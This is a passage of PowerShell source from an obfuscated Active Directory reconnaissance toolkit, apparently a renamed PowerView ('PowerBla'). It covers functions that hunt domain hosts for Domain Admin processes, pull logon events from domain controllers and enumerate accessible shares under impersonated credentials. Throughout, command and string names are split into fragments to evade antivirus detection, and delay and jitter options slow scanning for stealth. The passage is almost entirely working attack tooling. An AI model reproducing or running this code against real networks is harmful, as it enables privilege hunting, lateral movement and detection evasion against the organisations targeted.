        [ValidateSet(('B'+'ase'), ('OneLev'+'el'), ('Sub'+'tree'))]
        [String]
        $SearchScope = ('Sub'+'tr'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            ('Pr'+'opert'+'i'+'es') = ('d'+'nsh'+'ostname')
        }
        if ($PSBoundParameters[('D'+'omai'+'n')]) { $ComputerSearcherArguments[('Dom'+'a'+'in')] = $Domain }
        if ($PSBoundParameters[('Comp'+'u'+'te'+'rDomain')]) { $ComputerSearcherArguments[('Dom'+'ain')] = $ComputerDomain }
        if ($PSBoundParameters[('Co'+'mput'+'erL'+'DAPFilter')]) { $ComputerSearcherArguments[('LD'+'A'+'PFi'+'lter')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[('Compu'+'terS'+'e'+'archBase')]) { $ComputerSearcherArguments[('Se'+'arch'+'Ba'+'se')] = $ComputerSearchBase }
        if ($PSBoundParameters[('Unc'+'ons'+'trai'+'ned')]) { $ComputerSearcherArguments[('Un'+'constrai'+'ned')] = $Unconstrained }
        if ($PSBoundParameters[('ComputerOp'+'er'+'ati'+'ngSyst'+'em')]) { $ComputerSearcherArguments[('Ope'+'ratingSyste'+'m')] = $OperatingSystem }
        if ($PSBoundParameters[('Co'+'m'+'puterS'+'ervicePa'+'ck')]) { $ComputerSearcherArguments[('S'+'ervi'+'cePack')] = $ServicePack }
        if ($PSBoundParameters[('Co'+'mputerS'+'i'+'t'+'eName')]) { $ComputerSearcherArguments[('SiteNam'+'e')] = $SiteName }
        if ($PSBoundParameters[('S'+'erver')]) { $ComputerSearcherArguments[('S'+'erve'+'r')] = $Server }
        if ($PSBoundParameters[('S'+'earchSc'+'ope')]) { $ComputerSearcherArguments[('Se'+'a'+'rchScope')] = $SearchScope }
        if ($PSBoundParameters[('Result'+'P'+'age'+'Size')]) { $ComputerSearcherArguments[('ResultP'+'a'+'geSi'+'z'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('ServerTim'+'eLimi'+'t')]) { $ComputerSearcherArguments[('Server'+'Tim'+'eLimi'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('T'+'ombston'+'e')]) { $ComputerSearcherArguments[('To'+'mbston'+'e')] = $Tombstone }
        if ($PSBoundParameters[('C'+'redent'+'i'+'al')]) { $ComputerSearcherArguments[('Cred'+'entia'+'l')] = $Credential }

        $UserSearcherArguments = @{
            ('P'+'rope'+'rties') = ('samacco'+'u'+'ntna'+'me')
        }
        if ($PSBoundParameters[('Use'+'rIde'+'nt'+'ity')]) { $UserSearcherArguments[('Identi'+'t'+'y')] = $UserIdentity }
        if ($PSBoundParameters[('Do'+'main')]) { $UserSearcherArguments[('D'+'omain')] = $Domain }
        if ($PSBoundParameters[('Us'+'erD'+'omain')]) { $UserSearcherArguments[('Do'+'main')] = $UserDomain }
        if ($PSBoundParameters[('UserL'+'DA'+'PFilte'+'r')]) { $UserSearcherArguments[('LDAP'+'Fil'+'ter')] = $UserLDAPFilter }
        if ($PSBoundParameters[('U'+'ser'+'SearchBase')]) { $UserSearcherArguments[('Sear'+'c'+'hBase')] = $UserSearchBase }
        if ($PSBoundParameters[('UserAdminC'+'ou'+'n'+'t')]) { $UserSearcherArguments[('A'+'dm'+'inCount')] = $UserAdminCount }
        if ($PSBoundParameters[('Ser'+'ver')]) { $UserSearcherArguments[('Serve'+'r')] = $Server }
        if ($PSBoundParameters[('Se'+'a'+'rchScope')]) { $UserSearcherArguments[('Sear'+'ch'+'S'+'cope')] = $SearchScope }
        if ($PSBoundParameters[('Res'+'ult'+'Pag'+'eSize')]) { $UserSearcherArguments[('Re'+'sultP'+'ageSize')] = $ResultPageSize }
        if ($PSBoundParameters[('Serve'+'rT'+'im'+'eLimi'+'t')]) { $UserSearcherArguments[('Server'+'Tim'+'eLi'+'m'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tombs'+'ton'+'e')]) { $UserSearcherArguments[('T'+'o'+'mbstone')] = $Tombstone }
        if ($PSBoundParameters[('Crede'+'nt'+'ial')]) { $UserSearcherArguments[('Cre'+'dentia'+'l')] = $Credential }


        if ($PSBoundParameters[('Com'+'p'+'uter'+'Name')]) {
            $TargetComputers = $ComputerName
        }
        else {
            &('Wr'+'ite-Verb'+'o'+'se') ('[F'+'ind'+'-'+'Dom'+'ainProces'+'s] '+'Q'+'ueryi'+'ng c'+'om'+'pu'+'ter'+'s in'+' the domain')
            $TargetComputers = &('Get'+'-D'+'omainComput'+'er') @ComputerSearcherArguments | &('Select'+'-Objec'+'t') -ExpandProperty dnshostname
        }
        &('Writ'+'e-Ver'+'b'+'ose') "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ('[Find-DomainProce'+'ss] No hosts'+' fo'+'u'+'nd to'+' en'+'umera'+'te')
        }

        if ($PSBoundParameters[('Process'+'Nam'+'e')]) {
            $TargetProcessName = @()
            ForEach ($T in $ProcessName) {
                $TargetProcessName += $T.Split(',')
            }
            if ($TargetProcessName -isnot [System.Array]) {
                $TargetProcessName = [String[]] @($TargetProcessName)
            }
        }
        elseif ($PSBoundParameters[('Use'+'rIdenti'+'t'+'y')] -or $PSBoundParameters[('Use'+'rL'+'DAP'+'Filter')] -or $PSBoundParameters[('U'+'serSe'+'archBase')] -or $PSBoundParameters[('UserA'+'d'+'minCo'+'unt')] -or $PSBoundParameters[('U'+'s'+'e'+'rAl'+'lo'+'wDelega'+'tion')]) {
            $TargetUsers = &('G'+'et-D'+'oma'+'in'+'User') @UserSearcherArguments | &('S'+'elec'+'t-Objec'+'t') -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                ('Ident'+'i'+'ty') = $UserGroupIdentity
                ('Re'+'c'+'urse') = $True
            }
            if ($PSBoundParameters[('U'+'serDom'+'ain')]) { $GroupSearcherArguments[('Do'+'mai'+'n')] = $UserDomain }
            if ($PSBoundParameters[('UserS'+'ea'+'rchBa'+'se')]) { $GroupSearcherArguments[('Sea'+'rch'+'Base')] = $UserSearchBase }
            if ($PSBoundParameters[('Serv'+'e'+'r')]) { $GroupSearcherArguments[('Se'+'rver')] = $Server }
            if ($PSBoundParameters[('Sea'+'r'+'chSco'+'pe')]) { $GroupSearcherArguments[('Search'+'Sco'+'pe')] = $SearchScope }
            if ($PSBoundParameters[('R'+'e'+'sult'+'PageS'+'ize')]) { $GroupSearcherArguments[('R'+'es'+'ultPag'+'eS'+'ize')] = $ResultPageSize }
            if ($PSBoundParameters[('Serv'+'e'+'rT'+'imeLi'+'mit')]) { $GroupSearcherArguments[('Se'+'rver'+'TimeLimit')] = $ServerTimeLimit }
            if ($PSBoundParameters[('Tomb'+'st'+'one')]) { $GroupSearcherArguments[('Tombston'+'e')] = $Tombstone }
            if ($PSBoundParameters[('Cr'+'edentia'+'l')]) { $GroupSearcherArguments[('Crede'+'nti'+'al')] = $Credential }
            $GroupSearcherArguments
            $TargetUsers = &('Get-D'+'omainGroupM'+'e'+'m'+'ber') @GroupSearcherArguments | &('Se'+'lec'+'t'+'-Object') -ExpandProperty MemberName
        }

        $HostEnumBlock = {
            Param($ComputerName, $ProcessName, $TargetUsers, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = &('Tes'+'t-Con'+'n'+'ection') -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    if ($Credential) {
                        $Processes = &('Get'+'-'+'W'+'MIProce'+'ss') -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    else {
                        $Processes = &('G'+'et-WMIPro'+'ce'+'ss') -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    ForEach ($Process in $Processes) {
                        if ($ProcessName) {
                            if ($ProcessName -Contains $Process.ProcessName) {
                                $Process
                            }
                        }
                        elseif ($TargetUsers -Contains $Process.User) {
                            $Process
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters[('Dela'+'y')] -or $PSBoundParameters[('St'+'opO'+'nSucce'+'ss')]) {

            &('W'+'rite'+'-Verb'+'ose') "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count) "
            &('Wr'+'ite-Ve'+'rbos'+'e') ('[Find-'+'Domain'+'Pro'+'cess'+'] '+'D'+'el'+'ay: '+"$Delay, "+'Jitt'+'e'+'r: '+"$Jitter")
            $Counter = 0
            $RandNo = &('Ne'+'w-Obje'+'ct') System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                &('Start-'+'S'+'leep') -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                &('Write-Ver'+'bos'+'e') "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                $Result = &('In'+'vo'+'ke-Com'+'mand') -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    &('Wr'+'ite-'+'Ver'+'bose') ('[Find'+'-DomainPr'+'oc'+'ess] Targe'+'t user '+'fo'+'un'+'d,'+' '+'ret'+'urning ea'+'rly')
                    return
                }
            }
        }
        else {
            &('Wri'+'te-'+'Verb'+'ose') ('[F'+'ind'+'-Domain'+'Proc'+'e'+'ss] '+'Usin'+'g '+'th'+'re'+'ading '+'with'+' '+'t'+'hr'+'eads: '+"$Threads")

            $ScriptParams = @{
                ('Pro'+'cessNa'+'me') = $TargetProcessName
                ('Ta'+'rgetUse'+'rs') = $TargetUsers
                ('C'+'reden'+'tial') = $Credential
            }

            &('New-T'+'h'+'r'+'eadedFu'+'nct'+'i'+'on') -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainUserEvent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'ShouldProc'+'ess'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSUseDec'+'l'+'a'+'re'+'dVars'+'MoreThanA'+'ssig'+'n'+'ments'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SU'+'se'+'PSCr'+'edent'+'ia'+'lType'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSA'+'vo'+'idUsingP'+'lai'+'nText'+'Fo'+'rP'+'asswor'+'d'), '')]
    [OutputType(('Po'+'we'+'rBla.L'+'ogonE'+'vent'))]
    [OutputType(('Power'+'Bla.Expl'+'ic'+'itCred'+'ent'+'ia'+'l'+'Logon'))]
    [CmdletBinding(DefaultParameterSetName = {'D'+'oma'+'in'})]
    Param(
        [Parameter(ParameterSetName = "c`omPute`Rn`AMe", Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('dnsho'+'stna'+'me'), ('H'+'o'+'stName'), ('nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(ParameterSetName = "DoM`AIN")]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Gro'+'upNa'+'me'), ('Grou'+'p'))]
        [String[]]
        $UserGroupIdentity = ('Do'+'m'+'ai'+'n Admi'+'ns'),

        [Alias(('Admi'+'n'+'Count'))]
        [Switch]
        $UserAdminCount,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(('DomainC'+'ont'+'rol'+'ler'))]
        [String]
        $Server,

        [ValidateSet(('B'+'ase'), ('O'+'neLe'+'vel'), ('Subt'+'ree'))]
        [String]
        $SearchScope = ('S'+'ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $UserSearcherArguments = @{
            ('Prope'+'rt'+'ie'+'s') = ('sama'+'ccou'+'ntname')
        }
        if ($PSBoundParameters[('Us'+'erId'+'enti'+'ty')]) { $UserSearcherArguments[('I'+'denti'+'ty')] = $UserIdentity }
        if ($PSBoundParameters[('User'+'D'+'omain')]) { $UserSearcherArguments[('D'+'omain')] = $UserDomain }
        if ($PSBoundParameters[('UserLD'+'APFil'+'te'+'r')]) { $UserSearcherArguments[('LD'+'AP'+'Filter')] = $UserLDAPFilter }
        if ($PSBoundParameters[('UserSearchB'+'as'+'e')]) { $UserSearcherArguments[('Se'+'archB'+'ase')] = $UserSearchBase }
        if ($PSBoundParameters[('UserAdm'+'i'+'nC'+'ount')]) { $UserSearcherArguments[('AdminC'+'ou'+'nt')] = $UserAdminCount }
        if ($PSBoundParameters[('S'+'erver')]) { $UserSearcherArguments[('Serv'+'e'+'r')] = $Server }
        if ($PSBoundParameters[('Sea'+'r'+'chScope')]) { $UserSearcherArguments[('Search'+'S'+'co'+'pe')] = $SearchScope }
        if ($PSBoundParameters[('Res'+'ultPa'+'geSi'+'ze')]) { $UserSearcherArguments[('ResultPag'+'e'+'S'+'ize')] = $ResultPageSize }
        if ($PSBoundParameters[('Serve'+'rT'+'imeLim'+'i'+'t')]) { $UserSearcherArguments[('S'+'e'+'rve'+'rTimeLim'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tom'+'b'+'ston'+'e')]) { $UserSearcherArguments[('Tom'+'bst'+'one')] = $Tombstone }
        if ($PSBoundParameters[('Cr'+'edentia'+'l')]) { $UserSearcherArguments[('Crede'+'nt'+'ial')] = $Credential }

        if ($PSBoundParameters[('UserIde'+'nt'+'it'+'y')] -or $PSBoundParameters[('U'+'ser'+'LDAPFilt'+'er')] -or $PSBoundParameters[('UserS'+'earchBas'+'e')] -or $PSBoundParameters[('UserA'+'dminCo'+'unt')]) {
            $TargetUsers = &('Get'+'-Doma'+'inUser') @UserSearcherArguments | &('Sele'+'ct'+'-'+'Object') -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters[('Us'+'erGro'+'upI'+'dentity')] -or (-not $PSBoundParameters[('Fi'+'lter')])) {
            $GroupSearcherArguments = @{
                ('Id'+'ent'+'ity') = $UserGroupIdentity
                ('Re'+'curs'+'e') = $True
            }
            &('W'+'r'+'ite-V'+'erbose') ('Us'+'er'+'GroupId'+'entity: '+"$UserGroupIdentity")
            if ($PSBoundParameters[('Us'+'erD'+'omai'+'n')]) { $GroupSearcherArguments[('Doma'+'in')] = $UserDomain }
            if ($PSBoundParameters[('Use'+'rSea'+'rchBas'+'e')]) { $GroupSearcherArguments[('Se'+'archBa'+'s'+'e')] = $UserSearchBase }
            if ($PSBoundParameters[('S'+'erv'+'er')]) { $GroupSearcherArguments[('Ser'+'v'+'er')] = $Server }
            if ($PSBoundParameters[('S'+'earch'+'Sc'+'ope')]) { $GroupSearcherArguments[('S'+'ear'+'c'+'hScope')] = $SearchScope }
            if ($PSBoundParameters[('R'+'esultP'+'ag'+'eSiz'+'e')]) { $GroupSearcherArguments[('Res'+'ult'+'Pag'+'eSize')] = $ResultPageSize }
            if ($PSBoundParameters[('S'+'e'+'rverTimeLim'+'it')]) { $GroupSearcherArguments[('S'+'erve'+'rTimeL'+'imit')] = $ServerTimeLimit }
            if ($PSBoundParameters[('T'+'o'+'m'+'bstone')]) { $GroupSearcherArguments[('Tom'+'bstone')] = $Tombstone }
            if ($PSBoundParameters[('Cr'+'edenti'+'al')]) { $GroupSearcherArguments[('Cre'+'de'+'ntial')] = $Credential }
            $TargetUsers = &('Get-Domai'+'n'+'Group'+'Membe'+'r') @GroupSearcherArguments | &('Sel'+'ect'+'-'+'Object') -ExpandProperty MemberName
        }

        if ($PSBoundParameters[('Compute'+'r'+'Nam'+'e')]) {
            $TargetComputers = $ComputerName
        }
        else {
            $DCSearcherArguments = @{
                ('LD'+'AP') = $True
            }
            if ($PSBoundParameters[('Do'+'m'+'ain')]) { $DCSearcherArguments[('Dom'+'a'+'in')] = $Domain }
            if ($PSBoundParameters[('S'+'e'+'rver')]) { $DCSearcherArguments[('S'+'erver')] = $Server }
            if ($PSBoundParameters[('C'+'red'+'ent'+'ial')]) { $DCSearcherArguments[('C'+'reden'+'tial')] = $Credential }
            &('Write'+'-'+'Verbo'+'s'+'e') ('[Find-'+'D'+'oma'+'inUserE'+'vent]'+' '+'Quer'+'y'+'ing '+'for'+' '+'d'+'oma'+'in '+'co'+'ntrol'+'lers '+'in'+' '+'domai'+'n: '+"$Domain")
            $TargetComputers = &('Get'+'-Do'+'main'+'Controller') @DCSearcherArguments | &('Sel'+'ect-Ob'+'j'+'ect') -ExpandProperty dnshostname
        }
        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
            $TargetComputers = @(,$TargetComputers)
        }
        &('Write-'+'Ver'+'bose') "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length) "
        &('Write'+'-V'+'er'+'bose') ('[F'+'ind-Do'+'mai'+'nUserEvent'+'] '+'Targe'+'tC'+'ompu'+'t'+'ers '+"$TargetComputers")
        if ($TargetComputers.Length -eq 0) {
            throw ('['+'Find-DomainUser'+'Ev'+'ent]'+' No'+' ho'+'sts'+' '+'f'+'ound t'+'o en'+'ume'+'r'+'at'+'e')
        }

        $HostEnumBlock = {
            Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = &('T'+'est-Con'+'nect'+'ion') -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $DomainUserEventArgs = @{
                        ('Comput'+'erN'+'am'+'e') = $TargetComputer
                    }
                    if ($StartTime) { $DomainUserEventArgs[('St'+'artTi'+'me')] = $StartTime }
                    if ($EndTime) { $DomainUserEventArgs[('End'+'Tim'+'e')] = $EndTime }
                    if ($MaxEvents) { $DomainUserEventArgs[('Max'+'Events')] = $MaxEvents }
                    if ($Credential) { $DomainUserEventArgs[('C'+'re'+'denti'+'al')] = $Credential }
                    if ($Filter -or $TargetUsers) {
                        if ($TargetUsers) {
                            &('Get-Doma'+'in'+'U'+'serEvent') @DomainUserEventArgs | &('W'+'here-Ob'+'ject') {$TargetUsers -contains $_.TargetUserName}
                        }
                        else {
                            $Operator = 'or'
                            $Filter.Keys | &('ForE'+'ach'+'-Objec'+'t') {
                                if (($_ -eq 'Op') -or ($_ -eq ('Op'+'e'+'rator')) -or ($_ -eq ('Oper'+'at'+'ion'))) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq ('an'+'d'))) {
                                        $Operator = ('a'+'nd')
                                    }
                                }
                            }
                            $Keys = $Filter.Keys | &('W'+'her'+'e-Obje'+'ct') {($_ -ne 'Op') -and ($_ -ne ('Ope'+'r'+'ator')) -and ($_ -ne ('Oper'+'ati'+'on'))}
                            &('Ge'+'t'+'-DomainUserEve'+'n'+'t') @DomainUserEventArgs | &('Fo'+'rEach-'+'O'+'b'+'ject') {
                                if ($Operator -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $Filter[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $Filter[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        &('Get-Domain'+'Us'+'erE'+'vent') @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters[('De'+'lay')] -or $PSBoundParameters[('St'+'o'+'pOnSuccess')]) {

            &('W'+'rite-Verb'+'ose') "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count) "
            &('W'+'r'+'ite-Verbos'+'e') ('[Fi'+'nd-Doma'+'inUserE'+'ve'+'nt'+']'+' '+'De'+'l'+'ay: '+"$Delay, "+'Jit'+'ter: '+"$Jitter")
            $Counter = 0
            $RandNo = &('N'+'e'+'w-Object') System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                &('St'+'ar'+'t-Sleep') -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                &('Wri'+'t'+'e-Verb'+'ose') "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                $Result = &('Invo'+'k'+'e'+'-Comm'+'and') -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    &('Wri'+'te'+'-Verbo'+'s'+'e') ('[Find-'+'Do'+'mainU'+'serE'+'vent'+'] '+'Targ'+'e'+'t use'+'r f'+'ound, '+'return'+'ing'+' ea'+'rly')
                    return
                }
            }
        }
        else {
            &('Wr'+'i'+'te-Verbose') ('[Find'+'-Do'+'ma'+'inUse'+'rEve'+'nt'+'] '+'Usi'+'ng '+'threa'+'din'+'g '+'with'+' '+'threa'+'d'+'s: '+"$Threads")

            $ScriptParams = @{
                ('StartTi'+'m'+'e') = $StartTime
                ('EndT'+'ime') = $EndTime
                ('MaxE'+'ve'+'nt'+'s') = $MaxEvents
                ('Target'+'Use'+'rs') = $TargetUsers
                ('Filte'+'r') = $Filter
                ('Creden'+'tia'+'l') = $Credential
            }

            &('New-T'+'hr'+'eaded'+'Function') -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainShare {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'ould'+'Pro'+'c'+'ess'), '')]
    [OutputType(('P'+'o'+'werBla.ShareInf'+'o'))]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('D'+'N'+'SH'+'ostName'))]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [Alias(('Dom'+'a'+'in'))]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Operat'+'ing'+'S'+'y'+'stem'))]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(('Serv'+'ice'+'Pack'))]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(('S'+'ite'+'Name'))]
        [String]
        $ComputerSiteName,

        [Alias(('Che'+'ckAcces'+'s'))]
        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(('Dom'+'ai'+'nCo'+'ntr'+'oller'))]
        [String]
        $Server,

        [ValidateSet(('B'+'ase'), ('O'+'n'+'eLevel'), ('Subtre'+'e'))]
        [String]
        $SearchScope = ('Su'+'btre'+'e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            ('Proper'+'tie'+'s') = ('dn'+'shostn'+'a'+'me')
        }
        if ($PSBoundParameters[('Comp'+'u'+'terD'+'om'+'ain')]) { $ComputerSearcherArguments[('Doma'+'in')] = $ComputerDomain }
        if ($PSBoundParameters[('Co'+'mputerL'+'D'+'APFilt'+'er')]) { $ComputerSearcherArguments[('LDAPF'+'il'+'ter')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[('C'+'omp'+'ute'+'rSearchBase')]) { $ComputerSearcherArguments[('SearchBa'+'s'+'e')] = $ComputerSearchBase }
        if ($PSBoundParameters[('Un'+'co'+'nstra'+'i'+'ned')]) { $ComputerSearcherArguments[('Unco'+'nst'+'r'+'ai'+'ned')] = $Unconstrained }
        if ($PSBoundParameters[('Computer'+'O'+'pera'+'tin'+'g'+'System')]) { $ComputerSearcherArguments[('Oper'+'atingS'+'yste'+'m')] = $OperatingSystem }
        if ($PSBoundParameters[('C'+'om'+'puter'+'ServiceP'+'ac'+'k')]) { $ComputerSearcherArguments[('Serv'+'ic'+'e'+'Pack')] = $ServicePack }
        if ($PSBoundParameters[('Compu'+'terSi'+'teNam'+'e')]) { $ComputerSearcherArguments[('Site'+'N'+'ame')] = $SiteName }
        if ($PSBoundParameters[('Ser'+'ver')]) { $ComputerSearcherArguments[('Se'+'rv'+'er')] = $Server }
        if ($PSBoundParameters[('Sea'+'rchSc'+'ope')]) { $ComputerSearcherArguments[('Searc'+'hS'+'cope')] = $SearchScope }
        if ($PSBoundParameters[('Re'+'s'+'ul'+'tPageSize')]) { $ComputerSearcherArguments[('R'+'es'+'u'+'ltPag'+'eSize')] = $ResultPageSize }
        if ($PSBoundParameters[('S'+'erverTimeL'+'imi'+'t')]) { $ComputerSearcherArguments[('Ser'+'verT'+'im'+'eLimi'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tomb'+'stone')]) { $ComputerSearcherArguments[('Tombsto'+'ne')] = $Tombstone }
        if ($PSBoundParameters[('Cred'+'enti'+'al')]) { $ComputerSearcherArguments[('Cr'+'ede'+'n'+'tial')] = $Credential }

        if ($PSBoundParameters[('Comp'+'uterN'+'am'+'e')]) {
            $TargetComputers = $ComputerName
        }
        else {
            &('Wr'+'ite-'+'Ve'+'rb'+'ose') ('[Find-D'+'omainShare] Qu'+'erying'+' c'+'om'+'puters in'+' the '+'doma'+'in')
            $TargetComputers = &('Ge'+'t-Dom'+'ainC'+'om'+'pu'+'ter') @ComputerSearcherArguments | &('Sel'+'e'+'ct-Ob'+'ject') -ExpandProperty dnshostname
        }
        &('W'+'rite-Verbos'+'e') "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ('[Find-Dom'+'ainShare'+']'+' No host'+'s '+'fou'+'nd '+'to '+'enumerat'+'e')
        }

        $HostEnumBlock = {
            Param($ComputerName, $CheckShareAccess, $TokenHandle)

            if ($TokenHandle) {
                $Null = &('I'+'nv'+'oke-UserImper'+'s'+'o'+'na'+'tio'+'n') -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = &('T'+'est-Con'+'nec'+'ti'+'on') -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Shares = &('Ge'+'t-Ne'+'t'+'Share') -ComputerName $TargetComputer
                    ForEach ($Share in $Shares) {
                        $ShareName = $Share.Name
                        $Path = (('uTH'+'uTH').repLace('uTH',[sTrING][char]92))+$TargetComputer+'\'+$ShareName

                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
                            if ($CheckShareAccess) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    &('Wr'+'it'+'e'+'-Verbo'+'se') ('E'+'rr'+'or '+'ac'+'cess'+'ing '+'s'+'hare '+'p'+'ath '+"$Path "+': '+"$_")
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                &('I'+'n'+'vok'+'e'+'-'+'R'+'evertToSelf')
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[('Cr'+'e'+'denti'+'al')]) {
            if ($PSBoundParameters[('De'+'lay')] -or $PSBoundParameters[('S'+'to'+'pOn'+'Succ'+'ess')]) {
                $LogonToken = &('Invoke'+'-Us'+'e'+'rI'+'mpers'+'onat'+'ion') -Credential $Credential
            }
            else {
                $LogonToken = &('Invoke-Use'+'rIm'+'pe'+'rsonatio'+'n') -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters[('Dela'+'y')] -or $PSBoundParameters[('Stop'+'On'+'Success')]) {

            &('Write-'+'Ve'+'rbos'+'e') "[Find-DomainShare] Total number of hosts: $($TargetComputers.count) "
